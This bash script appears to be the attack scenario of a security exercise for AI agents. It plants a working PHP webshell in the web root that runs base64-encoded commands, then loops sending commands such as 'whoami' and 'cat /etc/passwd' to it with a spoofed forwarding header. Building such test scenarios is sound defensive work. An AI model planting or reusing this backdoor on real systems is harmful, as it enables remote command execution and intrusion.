#!/bin/bash
# Hard: Active Webshell C2
# Plants a PHP backdoor in the web root, then continuously sends shell commands
# to it via HTTP — generating distinctive access log entries.
# The agent must BOTH kill this process (kill_process) AND delete the file (delete_file).

BACKDOOR="/var/www/html/backdoor.php"

echo "hard_attack: planting backdoor at $BACKDOOR"
cat > "$BACKDOOR" << 'EOF'
<?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
EOF

echo "hard_attack: backdoor planted, starting C2 loop"
while true; do
    # Send encoded shell commands to the webshell
    curl -s -H "X-Forwarded-For: 10.0.0.3" \
        "http://localhost/backdoor.php?cmd=$(echo -n 'whoami' | base64)" > /dev/null
    sleep 1
    curl -s -H "X-Forwarded-For: 10.0.0.3" \
        "http://localhost/backdoor.php?cmd=$(echo -n 'id' | base64)" > /dev/null
    sleep 1
    curl -s -H "X-Forwarded-For: 10.0.0.3" \
        "http://localhost/backdoor.php?cmd=$(echo -n 'cat /etc/passwd' | base64)" > /dev/null
    sleep 2
done
